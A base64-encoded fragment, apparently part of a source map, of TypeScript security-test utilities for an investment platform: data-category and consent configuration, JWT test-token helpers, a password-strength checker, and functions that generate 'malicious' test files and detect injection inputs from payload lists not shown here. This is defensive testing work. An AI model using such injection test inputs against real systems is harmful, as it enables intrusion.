zoge1xuICAgIHBlcnNvbmFsSWRlbnRpZmllcnM6IFtcbiAgICAgICduYW1lJywgJ2VtYWlsJywgJ3Bob25lJywgJ2FkZHJlc3MnLCAnc3NuJywgJ3Bhc3Nwb3J0JyxcbiAgICAgICdkcml2ZXJzX2xpY2Vuc2UnLCAnZW1wbG95ZWVfaWQnLCAnY3VzdG9tZXJfaWQnXG4gICAgXSxcbiAgICBmaW5hbmNpYWxEYXRhOiBbXG4gICAgICAnYmFua19hY2NvdW50JywgJ2NyZWRpdF9jYXJkJywgJ2ludmVzdG1lbnRfYWNjb3VudCcsXG4gICAgICAndHJhbnNhY3Rpb25faGlzdG9yeScsICdjcmVkaXRfc2NvcmUnLCAnaW5jb21lJ1xuICAgIF0sXG4gICAgYmlvbWV0cmljRGF0YTogW1xuICAgICAgJ2ZpbmdlcnByaW50JywgJ2ZhY2lhbF9yZWNvZ25pdGlvbicsICd2b2ljZV9wcmludCcsXG4gICAgICAncmV0aW5hX3NjYW4nLCAnZG5hX3Byb2ZpbGUnXG4gICAgXSxcbiAgICBoZWFsdGhEYXRhOiBbXG4gICAgICAnbWVkaWNhbF9yZWNvcmRzJywgJ2hlYWx0aF9pbnN1cmFuY2UnLCAncHJlc2NyaXB0aW9uX2hpc3RvcnknLFxuICAgICAgJ21lbnRhbF9oZWFsdGgnLCAnZ2VuZXRpY19pbmZvcm1hdGlvbidcbiAgICBdLFxuICAgIGJlaGF2aW9yYWxEYXRhOiBbXG4gICAgICAnYnJvd3NpbmdfaGlzdG9yeScsICdzZWFyY2hfcXVlcmllcycsICdsb2NhdGlvbl9kYXRhJyxcbiAgICAgICdhcHBfdXNhZ2UnLCAnc29jaWFsX21lZGlhX2FjdGl2aXR5J1xuICAgIF1cbiAgfSxcblxuICAvLyBDb25zZW50IHB1cnBvc2VzXG4gIGNvbnNlbnRQdXJwb3NlczogW1xuICAgIHtcbiAgICAgIGlkOiAnZXNzZW50aWFsX3NlcnZpY2VzJyxcbiAgICAgIG5hbWU6ICdFc3NlbnRpYWwgU2VydmljZXMnLFxuICAgICAgZGVzY3JpcHRpb246ICdDb3JlIGZ1bmN0aW9uYWxpdHkgb2YgdGhlIGludmVzdG1lbnQgcGxhdGZvcm0nLFxuICAgICAgcmVxdWlyZWQ6IHRydWUsXG4gICAgICBjYXRlZ29yeTogJ25lY2Vzc2FyeSdcbiAgICB9LFxuICAgIHtcbiAgICAgIGlkOiAncGVyc29uYWxpemF0aW9uJyxcbiAgICAgIG5hbWU6ICdQZXJzb25hbGl6YXRpb24nLFxuICAgICAgZGVzY3JpcHRpb246ICdDdXN0b21pemUgaW52ZXN0bWVudCByZWNvbW1lbmRhdGlvbnMnLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgICAgY2F0ZWdvcnk6ICdwcmVmZXJlbmNlcydcbiAgICB9LFxuICAgIHtcbiAgICAgIGlkOiAnbWFya2V0aW5nJyxcbiAgICAgIG5hbWU6ICdNYXJrZXRpbmcgQ29tbXVuaWNhdGlvbnMnLFxuICAgICAgZGVzY3JpcHRpb246ICdTZW5kIHByb21vdGlvbmFsIGVtYWlscyBhbmQgdXBkYXRlcycsXG4gICAgICByZXF1aXJlZDogZmFsc2UsXG4gICAgICBjYXRlZ29yeTogJ21hcmtldGluZydcbiAgICB9LFxuICAgIHtcbiAgICAgIGlkOiAnYW5hbHl0aWNzJyxcbiAgICAgIG5hbWU6ICdBbmFseXRpY3MgYW5kIEltcHJvdmVtZW50JyxcbiAgICAgIGRlc2NyaXB0aW9uOiAnQW5hbHl6ZSB1c2FnZSBwYXR0ZXJucyB0byBpbXByb3ZlIHNlcnZpY2VzJyxcbiAgICAgIHJlcXVpcmVkOiBmYWxzZSxcbiAgICAgIGNhdGVnb3J5OiAnYW5hbHl0aWNzJ1xuICAgIH0sXG4gICAge1xuICAgICAgaWQ6ICd0aGlyZF9wYXJ0eV9zaGFyaW5nJyxcbiAgICAgIG5hbWU6ICdUaGlyZC1QYXJ0eSBTaGFyaW5nJyxcbiAgICAgIGRlc2NyaXB0aW9uOiAnU2hhcmUgZGF0YSB3aXRoIHRydXN0ZWQgcGFydG5lcnMnLFxuICAgICAgcmVxdWlyZWQ6IGZhbHNlLFxuICAgICAgY2F0ZWdvcnk6ICdzaGFyaW5nJ1xuICAgIH1cbiAgXSxcblxuICAvLyBEYXRhIHJldGVudGlvbiBwZXJpb2RzIChpbiBkYXlzKVxuICByZXRlbnRpb25QZXJpb2RzOiB7XG4gICAgcGVyc29uYWxEYXRhOiA3ICogMzY1LCAvLyA3IHllYXJzXG4gICAgZmluYW5jaWFsVHJhbnNhY3Rpb25zOiA3ICogMzY1LCAvLyA3IHllYXJzXG4gICAgYXVkaXRMb2dzOiA3ICogMzY1LCAvLyA3IHllYXJzXG4gICAgc3lzdGVtTG9nczogMiAqIDM2NSwgLy8gMiB5ZWFyc1xuICAgIG1hcmtldGluZ0RhdGE6IDMgKiAzNjUsIC8vIDMgeWVhcnNcbiAgICBhbmFseXRpY3NEYXRhOiAyICogMzY1LCAvLyAyIHllYXJzXG4gICAgc2Vzc2lvbkRhdGE6IDMwLCAvLyAzMCBkYXlzXG4gICAgdGVtcG9yYXJ5RmlsZXM6IDcgLy8gNyBkYXlzXG4gIH0sXG5cbiAgLy8gQ291bnRyaWVzIHdpdGggYWRlcXVhY3kgZGVjaXNpb25zIChHRFBSKVxuICBhZGVxdWF0ZUNvdW50cmllczogW1xuICAgICdBbmRvcnJhJywgJ0FyZ2VudGluYScsICdDYW5hZGEnLCAnRmFyb2UgSXNsYW5kcycsICdHdWVybnNleScsXG4gICAgJ0lzcmFlbCcsICdJc2xlIG9mIE1hbicsICdKYXBhbicsICdKZXJzZXknLCAnTmV3IFplYWxhbmQnLFxuICAgICdTb3V0aCBLb3JlYScsICdTd2l0emVybGFuZCcsICdVbml0ZWQgS2luZ2RvbScsICdVcnVndWF5J1xuICBdXG59O1xuXG4vLyBTZWN1cml0eSB0ZXN0aW5nIHV0aWxpdGllc1xuZXhwb3J0IGNsYXNzIFNlY3VyaXR5VGVzdFV0aWxzIHtcbiAgLyoqXG4gICAqIEdlbmVyYXRlIHRlc3QgSldUIHRva2VuXG4gICAqL1xuICBzdGF0aWMgZ2VuZXJhdGVUZXN0SldUKHBheWxvYWQ6IGFueSwgc2VjcmV0OiBzdHJpbmcgPSAndGVzdC1zZWNyZXQnLCBleHBpcmVzSW46IHN0cmluZyA9ICcxaCcpOiBzdHJpbmcge1xuICAgIGNvbnN0IGp3dCA9IHJlcXVpcmUoJ2pzb253ZWJ0b2tlbicpO1xuICAgIHJldHVybiBqd3Quc2lnbihwYXlsb2FkLCBzZWNyZXQsIHsgZXhwaXJlc0luIH0pO1xuICB9XG5cbiAgLyoqXG4gICAqIEdlbmVyYXRlIGV4cGlyZWQgSldUIHRva2VuXG4gICAqL1xuICBzdGF0aWMgZ2VuZXJhdGVFeHBpcmVkSldUKHBheWxvYWQ6IGFueSwgc2VjcmV0OiBzdHJpbmcgPSAndGVzdC1zZWNyZXQnKTogc3RyaW5nIHtcbiAgICBjb25zdCBqd3QgPSByZXF1aXJlKCdqc29ud2VidG9rZW4nKTtcbiAgICByZXR1cm4gand0LnNpZ24ocGF5bG9hZCwgc2VjcmV0LCB7IGV4cGlyZXNJbjogJy0xaCcgfSk7XG4gIH1cblxuICAvKipcbiAgICogR2VuZXJhdGUgbWFsaWNpb3VzIGZpbGUgZm9yIHRlc3RpbmdcbiAgICovXG4gIHN0YXRpYyBnZW5lcmF0ZU1hbGljaW91c0ZpbGUodHlwZTogJ3NjcmlwdCcgfCAnc3FsJyB8ICdjb21tYW5kJyB8ICdiaW5hcnknKTogQnVmZmVyIHtcbiAgICBzd2l0Y2ggKHR5cGUpIHtcbiAgICAgIGNhc2UgJ3NjcmlwdCc6XG4gICAgICAgIHJldHVybiBCdWZmZXIuZnJvbShTRUNVUklUWV9URVNUX0RBVEEubWFsaWNpb3VzRmlsZUNvbnRlbnQuc2NyaXB0SW5qZWN0aW9uKTtcbiAgICAgIGNhc2UgJ3NxbCc6XG4gICAgICAgIHJldHVybiBCdWZmZXIuZnJvbShTRUNVUklUWV9URVNUX0RBVEEubWFsaWNpb3VzRmlsZUNvbnRlbnQuc3FsSW5qZWN0aW9uKTtcbiAgICAgIGNhc2UgJ2NvbW1hbmQnOlxuICAgICAgICByZXR1cm4gQnVmZmVyLmZyb20oU0VDVVJJVFlfVEVTVF9EQVRBLm1hbGljaW91c0ZpbGVDb250ZW50LmNvbW1hbmRJbmplY3Rpb24pO1xuICAgICAgY2FzZSAnYmluYXJ5JzpcbiAgICAgICAgcmV0dXJuIFNFQ1VSSVRZX1RFU1RfREFUQS5tYWxpY2lvdXNGaWxlQ29udGVudC5iaW5hcnlQYXlsb2FkO1xuICAgICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIEJ1ZmZlci5mcm9tKCdtYWxpY2lvdXMgY29udGVudCcpO1xuICAgIH1cbiAgfVxuXG4gIC8qKlxuICAgKiBWYWxpZGF0ZSBwYXNzd29yZCBzdHJlbmd0aFxuICAgKi9cbiAgc3RhdGljIHZhbGlkYXRlUGFzc3dvcmRTdHJlbmd0aChwYXNzd29yZDogc3RyaW5nKToge1xuICAgIGlzU3Ryb25nOiBib29sZWFuO1xuICAgIHNjb3JlOiBudW1iZXI7XG4gICAgZmVlZGJhY2s6IHN0cmluZ1tdO1xuICB9IHtcbiAgICBjb25zdCBmZWVkYmFjazogc3RyaW5nW10gPSBbXTtcbiAgICBsZXQgc2NvcmUgPSAwO1xuXG4gICAgaWYgKHBhc3N3b3JkLmxlbmd0aCA+PSBTRUNVUklUWV9URVNUX0NPTkZJRy5wYXNzd29yZFBvbGljeS5taW5MZW5ndGgpIHtcbiAgICAgIHNjb3JlICs9IDIwO1xuICAgIH0gZWxzZSB7XG4gICAgICBmZWVkYmFjay5wdXNoKGBQYXNzd29yZCBtdXN0IGJlIGF0IGxlYXN0ICR7U0VDVVJJVFlfVEVTVF9DT05GSUcucGFzc3dvcmRQb2xpY3kubWluTGVuZ3RofSBjaGFyYWN0ZXJzIGxvbmdgKTtcbiAgICB9XG5cbiAgICBpZiAoL1tBLVpdLy50ZXN0KHBhc3N3b3JkKSkge1xuICAgICAgc2NvcmUgKz0gMjA7XG4gICAgfSBlbHNlIHtcbiAgICAgIGZlZWRiYWNrLnB1c2goJ1Bhc3N3b3JkIG11c3QgY29udGFpbiBhdCBsZWFzdCBvbmUgdXBwZXJjYXNlIGxldHRlcicpO1xuICAgIH1cblxuICAgIGlmICgvW2Etel0vLnRlc3QocGFzc3dvcmQpKSB7XG4gICAgICBzY29yZSArPSAyMDtcbiAgICB9IGVsc2Uge1xuICAgICAgZmVlZGJhY2sucHVzaCgnUGFzc3dvcmQgbXVzdCBjb250YWluIGF0IGxlYXN0IG9uZSBsb3dlcmNhc2UgbGV0dGVyJyk7XG4gICAgfVxuXG4gICAgaWYgKC9cXGQvLnRlc3QocGFzc3dvcmQpKSB7XG4gICAgICBzY29yZSArPSAyMDtcbiAgICB9IGVsc2Uge1xuICAgICAgZmVlZGJhY2sucHVzaCgnUGFzc3dvcmQgbXVzdCBjb250YWluIGF0IGxlYXN0IG9uZSBudW1iZXInKTtcbiAgICB9XG5cbiAgICBpZiAoL1shQCMkJV4mKigpXytcXC09XFxbXFxde307JzpcIlxcXFx8LC48PlxcLz9dLy50ZXN0KHBhc3N3b3JkKSkge1xuICAgICAgc2NvcmUgKz0gMjA7XG4gICAgfSBlbHNlIHtcbiAgICAgIGZlZWRiYWNrLnB1c2goJ1Bhc3N3b3JkIG11c3QgY29udGFpbiBhdCBsZWFzdCBvbmUgc3BlY2lhbCBjaGFyYWN0ZXInKTtcbiAgICB9XG5cbiAgICByZXR1cm4ge1xuICAgICAgaXNTdHJvbmc6IHNjb3JlID49IDgwLFxuICAgICAgc2NvcmUsXG4gICAgICBmZWVkYmFja1xuICAgIH07XG4gIH1cblxuICAvKipcbiAgICogQ2hlY2sgaWYgaW5wdXQgY29udGFpbnMgcG90ZW50aWFsIGluamVjdGlvblxuICAgKi9cbiAgc3RhdGljIGNvbnRhaW5zSW5qZWN0aW9uKGlucHV0OiBzdHJpbmcpOiB7XG4gICAgaGFzU1FMSW5qZWN0aW9uOiBib29sZWFuO1xuICAgIGhhc1hTUzogYm9vbGVhbjtcbiAgICBoYXNDb21tYW5kSW5qZWN0aW9uOiBib29sZWFuO1xuICAgIGhhc1BhdGhUcmF2ZXJzYWw6IGJvb2xlYW47XG4gIH0ge1xuICAgIHJldHVybiB7XG4gICAgICBoYXNTUUxJbmplY3Rpb246IFNFQ1VSSVRZX1RFU1RfREFUQS5zcWxJbmplY3Rpb25QYXlsb2Fkcy5zb21lKHBheWxvYWQgPT4gXG4gICAgICAgIGlucHV0LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMocGF5bG9hZC50b0xvd2VyQ2FzZSgpKVxuICAgICAgKSxcbiAgICAgIGhhc1hTUzogU0VDVVJJVFlfVEVTVF9EQVRBLnhzc1BheWxvYWRzLnNvbWUocGF5bG9hZCA9PiBcbiAgICAgICAgaW5wdXQudG9Mb3dlckNhc2UoKS5pbmNsdWRlcyhwYXlsb2FkLnRvTG93ZXJDYXNlKCkpXG4gICAgICApLFxuICAgICAgaGFzQ29tbWFuZEluamVjdGlvbjogU0VDVVJJVFlfVEVTVF9EQVRBLmNvbW1hbmRJbmplY3Rpb25QYXlsb2Fkcy5zb21lKHBheWxvYWQgPT4gXG4gICAgICAgIGlucHV0LmluY2x1ZGVzKHBheWxvYWQpXG4gICAgICApLFxuICAgICAgaGFzUGF0aFRyYXZlcnNhbDogU0VDVVJJVFlfVEVTVF9EQVRBLnBhdGhUcmF2ZXJzYWxQYXlsb2Fkcy5zb21lKHBheWxvYWQgPT4gXG4gICAgICAgIGlucHV0LmluY2x1ZGVzKHBheWxvYWQpXG4gICAgICApXG4gICAgfTtcbiAgfVxufSJdfQ==